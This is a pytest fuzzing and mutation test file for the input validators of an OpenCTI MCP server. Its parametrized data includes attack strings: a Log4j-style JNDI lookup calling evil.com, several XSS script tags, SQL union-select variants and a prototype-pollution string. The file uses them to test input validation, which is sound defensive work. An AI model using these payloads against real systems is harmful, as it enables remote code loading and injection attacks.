"""Fuzzing and mutation testing for OpenCTI MCP Server.

Systematic testing with:
- Byte-level mutations
- Format string attacks
- Encoding variations
- Boundary mutations
- Type coercion attacks
"""

from __future__ import annotations

import random
import string

import pytest
from opencti_mcp.validation import (
    MAX_QUERY_LENGTH,
    validate_date_filter,
    validate_label,
    validate_length,
    validate_uuid,
)


def validate_query(query: str) -> str:
    """Wrapper that validates query length and returns query."""
    if query is None:
        return ""
    validate_length(query, MAX_QUERY_LENGTH, "query")
    return query


def sanitize_for_graphql(value: str) -> str:
    """Simple GraphQL sanitization - escape quotes."""
    return value.replace("\\", "\\\\").replace('"', '\\"')


from opencti_mcp.errors import ValidationError

# =============================================================================
# Byte-Level Mutation Tests
# =============================================================================


class TestByteLevelMutations:
    """Test byte-level input mutations."""

    @pytest.mark.parametrize(
        "mutation",
        [
            b"\x00",  # Null byte
            b"\xff",  # Max byte
            b"\x01",  # SOH
            b"\x02",  # STX
            b"\x03",  # ETX
            b"\x04",  # EOT
            b"\x1b",  # Escape
            b"\x7f",  # DEL
            b"\x80",  # First non-ASCII
            b"\xfe",  # Invalid UTF-8 start
            b"\xff\xfe",  # BOM
            b"\xef\xbb\xbf",  # UTF-8 BOM
        ],
    )
    def test_binary_injection_in_query(self, mutation: bytes):
        """Binary bytes in query are handled safely."""
        try:
            decoded = mutation.decode("utf-8", errors="replace")
            query = f"test{decoded}query"
            # Should not crash, may reject
            validate_query(query)
        except (ValidationError, UnicodeDecodeError):
            pass  # Expected for invalid input

    @pytest.mark.parametrize("position", ["start", "middle", "end"])
    def test_null_byte_positions(self, position: str):
        """Null bytes at different positions are handled."""
        base = "testquery"
        if position == "start":
            query = "\x00" + base
        elif position == "middle":
            query = base[:4] + "\x00" + base[4:]
        else:
            query = base + "\x00"

        # validate_length only checks length - null bytes may pass through
        # The actual GraphQL sanitization happens elsewhere
        try:
            result = validate_query(query)
            # If it passes length check, that's OK - null bytes handled at API level
            assert isinstance(result, str)
        except ValidationError:
            pass  # Also acceptable

    def test_utf8_overlong_encoding(self):
        """Overlong UTF-8 encodings are handled.

        Overlong encodings are invalid UTF-8 that could bypass filters.
        Python's decoder should reject them.
        """
        # Overlong encoding of '/' (0x2f)
        overlong = b"\xc0\xaf"  # Invalid 2-byte encoding of /

        try:
            decoded = overlong.decode("utf-8")
            # If it somehow decoded, validation should catch it
            validate_query(decoded)
        except UnicodeDecodeError:
            pass  # Expected - Python rejects overlong encodings


# =============================================================================
# Format String Attack Tests
# =============================================================================


class TestFormatStringAttacks:
    """Test format string vulnerability prevention."""

    @pytest.mark.parametrize(
        "payload",
        [
            "%s%s%s%s%s",
            "%x%x%x%x%x",
            "%n%n%n%n%n",
            "%d%d%d%d%d",
            "%p%p%p%p%p",
            "%.1000000d",
            "%1$s",
            "%99999$n",
            "{0}{1}{2}",
            "{__class__}",
            "{.__class__.__mro__}",
            "%(name)s",
            "${{variable}}",
            "${jndi:ldap://evil.com}",  # Log4j style
            "${env:PATH}",
        ],
    )
    def test_format_string_in_query(self, payload: str):
        """Format strings don't cause issues."""
        # Should handle safely (store literally or reject)
        try:
            result = validate_query(payload)
            # If accepted, should be literal
            assert result == payload or "%" in result or "{" in result
        except ValidationError:
            pass  # Acceptable to reject

    @pytest.mark.parametrize(
        "payload",
        [
            "%s%s%s",
            "{name}",
            "%(key)s",
        ],
    )
    def test_format_string_in_label(self, payload: str):
        """Format strings in labels are handled."""
        try:
            result = validate_label(payload)
            # If accepted, literal storage
            assert result == payload
        except ValidationError:
            pass  # Labels may reject special chars


# =============================================================================
# Encoding Variation Tests
# =============================================================================


class TestEncodingVariations:
    """Test different encoding attacks."""

    @pytest.mark.parametrize(
        "encoding,query",
        [
            ("double_url", "test%2520query"),  # Double URL encode
            ("html_entity", "test&#x3c;script&#x3e;"),  # HTML entities
            ("unicode_escape", "test\\u003cscript\\u003e"),  # Unicode escape
            ("base64_like", "dGVzdA=="),  # Base64
            ("hex_encode", "\\x74\\x65\\x73\\x74"),  # Hex escapes
            ("octal", "\\164\\145\\163\\164"),  # Octal escapes
        ],
    )
    def test_encoded_payloads(self, encoding: str, query: str):
        """Various encodings are handled safely."""
        # Should not decode and execute
        try:
            result = validate_query(query)
            # If accepted, should be literal
            assert "<script>" not in result.lower()
        except ValidationError:
            pass

    @pytest.mark.parametrize(
        "char,variants",
        [
            ("<", ["<", "%3c", "%3C", "&lt;", "&#60;", "&#x3c;", "\\u003c"]),
            (">", [">", "%3e", "%3E", "&gt;", "&#62;", "&#x3e;", "\\u003e"]),
            ("'", ["'", "%27", "&#39;", "&#x27;", "\\u0027"]),
            ('"', ['"', "%22", "&quot;", "&#34;", "&#x22;", "\\u0022"]),
        ],
    )
    def test_dangerous_char_encodings(self, char: str, variants: list):
        """Dangerous chars in various encodings are handled."""
        for variant in variants:
            query = f"test{variant}query"
            try:
                result = sanitize_for_graphql(query)
                # Dangerous chars should be escaped or removed
                if char in ["<", ">"]:
                    # These might be allowed but shouldn't execute
                    pass
            except ValidationError:
                pass


# =============================================================================
# Boundary Mutation Tests
# =============================================================================


class TestBoundaryMutations:
    """Test boundary conditions with mutations."""

    def test_exactly_at_max_length(self):
        """String exactly at max length is valid."""
        query = "a" * 1000  # Exact limit
        result = validate_query(query)
        assert len(result) == 1000

    def test_one_over_max_length(self):
        """String one over max length is rejected."""
        query = "a" * 1001
        with pytest.raises(ValidationError):
            validate_query(query)

    def test_max_length_with_multibyte_chars(self):
        """Max length counts characters, not bytes."""
        # Each emoji is 1 char but multiple bytes
        query = "🔥" * 1000  # 1000 chars, but 4000 bytes
        result = validate_query(query)
        assert len(result) == 1000

    def test_uuid_boundary_lengths(self):
        """UUID length boundaries."""
        base = "12345678-1234-1234-1234-123456789abc"  # 36 chars

        # Valid
        validate_uuid(base, "id")

        # Too short
        with pytest.raises(ValidationError):
            validate_uuid(base[:-1], "id")

        # Too long
        with pytest.raises(ValidationError):
            validate_uuid(base + "x", "id")

    @pytest.mark.parametrize("offset", [-1, 0, 1])
    def test_date_year_boundaries(self, offset: int):
        """Date year boundaries."""
        # 1970 boundary
        year = 1970 + offset
        date = f"{year}-01-01"
        if year < 1970:
            with pytest.raises(ValidationError):
                validate_date_filter(date, "test")
        else:
            assert validate_date_filter(date, "test") == date

    @pytest.mark.parametrize("offset", [-1, 0, 1])
    def test_date_max_year_boundaries(self, offset: int):
        """Date max year boundaries."""
        # 2100 boundary
        year = 2100 + offset
        date = f"{year}-01-01"
        if year > 2100:
            with pytest.raises(ValidationError):
                validate_date_filter(date, "test")
        else:
            assert validate_date_filter(date, "test") == date


# =============================================================================
# Type Coercion Attack Tests
# =============================================================================


class TestTypeCoercionAttacks:
    """Test type coercion vulnerabilities."""

    @pytest.mark.parametrize(
        "value",
        [
            "true",
            "false",
            "null",
            "undefined",
            "NaN",
            "Infinity",
            "-Infinity",
            "0",
            "1",
            "-1",
            "0x0",
            "0o0",
            "0b0",
            "1e308",
            "1e-308",
        ],
    )
    def test_js_special_values_in_query(self, value: str):
        """JavaScript special values don't cause issues."""
        result = validate_query(value)
        # Should be treated as literal strings
        assert result == value

    @pytest.mark.parametrize(
        "value",
        [
            "[]",
            "{}",
            "[object Object]",
            "function(){}",
            "() => {}",
        ],
    )
    def test_js_object_strings_in_query(self, value: str):
        """JavaScript object strings are handled."""
        try:
            result = validate_query(value)
            assert result == value
        except ValidationError:
            pass  # May reject { and }

    def test_array_index_as_query(self):
        """Array index notation in query."""
        queries = [
            "array[0]",
            "obj['key']",
            'obj["key"]',
            "obj[key]",
            "__proto__[polluted]",
        ]
        for query in queries:
            try:
                result = validate_query(query)
                # Should not cause issues
            except ValidationError:
                pass


# =============================================================================
# Random Fuzzing Tests
# =============================================================================


class TestRandomFuzzing:
    """Random fuzzing tests."""

    def _random_string(self, length: int, charset: str = None) -> str:
        """Generate random string."""
        if charset is None:
            charset = string.printable
        return "".join(random.choice(charset) for _ in range(length))

    @pytest.mark.parametrize("seed", range(20))
    def test_random_queries(self, seed: int):
        """Random query strings don't crash validation."""
        random.seed(seed)
        query = self._random_string(random.randint(1, 500))

        try:
            validate_query(query)
        except ValidationError:
            pass  # Expected for some random input
        # Should not crash

    @pytest.mark.parametrize("seed", range(20))
    def test_random_uuids(self, seed: int):
        """Random UUID-like strings are handled."""
        random.seed(seed)

        # Generate random UUID-like string
        parts = [
            self._random_string(8, string.hexdigits),
            self._random_string(4, string.hexdigits),
            self._random_string(4, string.hexdigits),
            self._random_string(4, string.hexdigits),
            self._random_string(12, string.hexdigits),
        ]
        uuid = "-".join(parts)

        try:
            validate_uuid(uuid, "id")
        except ValidationError:
            pass  # Expected for most random input

    @pytest.mark.parametrize("seed", range(10))
    def test_random_labels(self, seed: int):
        """Random labels don't crash validation."""
        random.seed(seed)
        label = self._random_string(random.randint(1, 50))

        try:
            validate_label(label)
        except ValidationError:
            pass  # Expected for some random input


# =============================================================================
# Mutation Operator Tests
# =============================================================================


class TestMutationOperators:
    """Test with systematic mutation operators."""

    @pytest.mark.parametrize(
        "mutation_type",
        [
            "delete_char",
            "duplicate_char",
            "insert_null",
            "flip_case",
        ],
    )
    def test_mutated_valid_uuid(self, mutation_type: str):
        """Mutated valid UUIDs are rejected or handled."""
        valid_uuid = "12345678-1234-1234-1234-123456789abc"

        if mutation_type == "delete_char":
            mutated = valid_uuid[:10] + valid_uuid[11:]
        elif mutation_type == "duplicate_char":
            mutated = valid_uuid[:10] + valid_uuid[10] + valid_uuid[10:]
        elif mutation_type == "insert_null":
            mutated = valid_uuid[:10] + "\x00" + valid_uuid[10:]
        elif mutation_type == "flip_case":
            mutated = valid_uuid.upper()  # This should actually still be valid
        else:
            mutated = valid_uuid

        if mutation_type == "flip_case":
            # UUID is case-insensitive
            validate_uuid(mutated, "id")
        else:
            with pytest.raises(ValidationError):
                validate_uuid(mutated, "id")

    def test_uuid_swap_adjacent_chars(self):
        """Swapping adjacent hex chars in UUID - may or may not be valid format."""
        valid_uuid = "12345678-1234-1234-1234-123456789abc"
        chars = list(valid_uuid)
        # Swap positions 10 and 11 (both hex digits)
        chars[10], chars[11] = chars[11], chars[10]
        mutated = "".join(chars)

        # Swapping adjacent hex chars keeps valid UUID format
        # It's just a different valid UUID
        try:
            validate_uuid(mutated, "id")
        except ValidationError:
            pass  # Also acceptable if validation is stricter

    @pytest.mark.parametrize(
        "mutation_type",
        [
            "replace_dash",
            "wrong_position_dash",
            "all_zeros",
            "all_fs",
        ],
    )
    def test_structurally_mutated_uuid(self, mutation_type: str):
        """Structurally mutated UUIDs are handled."""
        if mutation_type == "replace_dash":
            uuid = "12345678_1234_1234_1234_123456789abc"  # Underscores
        elif mutation_type == "wrong_position_dash":
            uuid = "1234567-81234-1234-1234-123456789abc"  # Wrong dash positions
        elif mutation_type == "all_zeros":
            uuid = "00000000-0000-0000-0000-000000000000"  # Nil UUID
        elif mutation_type == "all_fs":
            uuid = "ffffffff-ffff-ffff-ffff-ffffffffffff"  # Max UUID

        if mutation_type in ["all_zeros", "all_fs"]:
            # These are structurally valid
            validate_uuid(uuid, "id")
        else:
            with pytest.raises(ValidationError):
                validate_uuid(uuid, "id")


# =============================================================================
# Recursive Payload Tests
# =============================================================================


class TestRecursivePayloads:
    """Test recursive/nested payloads."""

    @pytest.mark.parametrize("depth", [1, 5, 10, 50])
    def test_nested_brackets(self, depth: int):
        """Nested brackets don't cause issues."""
        query = "(" * depth + "test" + ")" * depth
        try:
            result = validate_query(query)
            # Should handle without stack overflow
        except ValidationError:
            pass

    @pytest.mark.parametrize("depth", [1, 5, 10, 50])
    def test_nested_quotes(self, depth: int):
        """Nested quote escaping is handled."""
        query = '"' * depth + "test" + '"' * depth
        try:
            result = validate_query(query)
        except ValidationError:
            pass

    def test_nested_json_like_structures(self):
        """Nested JSON-like structures don't confuse parser."""
        queries = [
            '{"a":{"b":{"c":"test"}}}',
            '[[["test"]]]',
            '{"a":[{"b":1}]}',
        ]
        for query in queries:
            try:
                validate_query(query)
            except ValidationError:
                pass  # May reject certain chars


# =============================================================================
# Polymorphic Attack Tests
# =============================================================================


class TestPolymorphicAttacks:
    """Test polymorphic attack variations."""

    @pytest.mark.parametrize(
        "variation",
        [
            "<script>alert(1)</script>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<ScRiPt>alert(1)</sCrIpT>",
            "<script >alert(1)</script >",
            "<script\n>alert(1)</script>",
            "<script\t>alert(1)</script>",
            "< script>alert(1)</script>",
        ],
    )
    def test_xss_case_variations(self, variation: str):
        """XSS with case/whitespace variations are handled.

        Note: Query validation is primarily length-based. XSS prevention
        happens at the GraphQL/API layer, not in query validation.
        The key is that these strings don't cause crashes or injections
        in the GraphQL query construction.
        """
        try:
            result = validate_query(variation)
            # Length validation may pass - that's OK
            # XSS protection is at the GraphQL sanitization layer
            assert isinstance(result, str)
        except ValidationError:
            pass  # Also acceptable

    @pytest.mark.parametrize(
        "variation",
        [
            "union select",
            "UNION SELECT",
            "UnIoN SeLeCt",
            "union/**/select",
            "union\nselect",
            "union\tselect",
        ],
    )
    def test_sql_case_variations(self, variation: str):
        """SQL injection with variations are handled."""
        query = f"test {variation} * from users"
        # Should be sanitized for GraphQL
        result = sanitize_for_graphql(query)
        # No SQL execution possible in GraphQL context anyway


# =============================================================================
# Async/Concurrent Mutation Tests
# =============================================================================


class TestConcurrentMutations:
    """Test validation under concurrent mutations."""

    @pytest.mark.asyncio
    async def test_concurrent_validations(self):
        """Concurrent validations don't interfere."""
        import asyncio

        async def validate_async(query: str):
            return validate_query(query)

        # Run many validations concurrently
        tasks = [validate_async(f"query{i}") for i in range(100)]
        results = await asyncio.gather(*tasks)
        assert len(results) == 100
        assert all(r == f"query{i}" for i, r in enumerate(results))

    @pytest.mark.asyncio
    async def test_validation_isolation(self):
        """Validation of one input doesn't affect another."""
        import asyncio

        results = []

        async def validate_and_record(query: str):
            try:
                result = validate_query(query)
                results.append(("ok", result))
            except ValidationError as e:
                results.append(("error", str(e)))

        # Mix valid and invalid
        queries = [
            "valid1",
            "x" * 2000,  # Too long
            "valid2",
            "y" * 2000,  # Too long
            "valid3",
        ]

        await asyncio.gather(*[validate_and_record(q) for q in queries])

        # Valid queries should succeed despite concurrent failures
        ok_results = [r for status, r in results if status == "ok"]
        assert len(ok_results) == 3
